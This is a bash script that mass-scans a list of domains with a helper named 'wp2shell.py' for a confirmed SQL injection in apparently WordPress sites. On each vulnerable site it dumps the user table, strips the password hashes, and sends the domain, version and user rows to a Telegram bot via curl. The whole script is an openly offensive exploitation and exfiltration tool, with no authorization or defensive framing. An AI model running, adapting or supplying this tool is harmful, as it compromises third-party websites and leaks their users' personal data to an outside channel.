#!/usr/bin/env bash
# batch-scan.sh — check + read users on confirmed vulns, send to Telegram

set -u

WORKERS="${2:-5}"
RESULTS_DIR="$(dirname "$0")/results"
SCRIPT_DIR="$(dirname "$0")"
TG_TOKEN="${TG_TOKEN:-}"
TG_CHAT_ID="${TG_CHAT_ID:-}"

mkdir -p "$RESULTS_DIR"

if [[ $# -lt 1 ]]; then
  echo "Usage: $0 domains.txt [workers]"
  exit 1
fi

tg_send() {
  [[ -z "$TG_TOKEN" || -z "$TG_CHAT_ID" ]] && return
  for chat_id in $TG_CHAT_ID; do
    curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
      -d chat_id="$chat_id" \
      -d text="$1" \
      -d parse_mode="HTML" > /dev/null 2>&1
  done
}

scan_one() {
  local domain="$1"
  local check_result

  check_result=$(timeout 60 python3 "$SCRIPT_DIR/wp2shell.py" check "https://$domain" 2>&1)

  if ! echo "$check_result" | grep -q "CONFIRMED\|VULNERABLE"; then
    echo "⚪ $domain — not vulnerable"
    echo "$domain | NOT VULNERABLE" >> "$RESULTS_DIR/not-vuln.txt"
    return
  fi

  echo "🔴 $domain — CONFIRMED, reading users..."

  local users_result
  users_result=$(timeout 300 python3 "$SCRIPT_DIR/wp2shell.py" read "https://$domain" --preset users 2>&1)

  local users_clean
  users_clean=$(echo "$users_result" | grep -E '^\s+[0-9]+\|' \
    | sed 's/|\$P\$[^|]*//g; s/|\$2y\$[^|]*//g; s/|\$wp\$[^|]*//g')

  local user_count=0
  [[ -n "$users_clean" ]] && user_count=$(echo "$users_clean" | wc -l | tr -d ' ')

  local ver batch
  ver=$(echo "$check_result" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
  batch=$(echo "$check_result" | grep -oE 'HTTP [0-9]+' | head -1)

  if [[ $user_count -gt 0 ]]; then
    tg_send "🔴 <b>VULNERABLE</b> — <code>$domain</code>

<b>Version:</b> $ver
<b>Batch:</b> $batch
<b>SQLi:</b> CONFIRMED

<b>Users ($user_count):</b>
<pre>$(echo "$users_clean" | head -10)</pre>"

    echo "$domain | VULNERABLE | $users_clean" >> "$RESULTS_DIR/confirmed.txt"
    echo "  ✓ $user_count users sent to Telegram"
  else
    tg_send "🔴 <b>VULNERABLE</b> — <code>$domain</code>

<b>Version:</b> $ver
<b>Batch:</b> $batch
<b>SQLi:</b> CONFIRMED
<b>Users:</b> extraction timeout"

    echo "$domain | VULNERABLE | read timeout" >> "$RESULTS_DIR/confirmed.txt"
    echo "  ✗ read failed, still sent to Telegram"
  fi
}

total=$(wc -l < "$1" | tr -d ' ')
echo "[*] Scanning $total domains with $WORKERS workers..."
echo ""

# Use GNU parallel if available, fallback to xargs
if command -v parallel &>/dev/null; then
  cat "$1" | parallel -j "$WORKERS" scan_one {}
else
  cat "$1" | xargs -P "$WORKERS" -I {} bash -c "$(declare -f scan_one); scan_one \"\$@\"" _ {}
fi

echo ""
echo "[+] Done."
echo "[+] Confirmed: $(cat "$RESULTS_DIR/confirmed.txt" 2>/dev/null | wc -l | tr -d ' ')"
echo "[+] Not vulnerable: $(cat "$RESULTS_DIR/not-vuln.txt" 2>/dev/null | wc -l | tr -d ' ')"
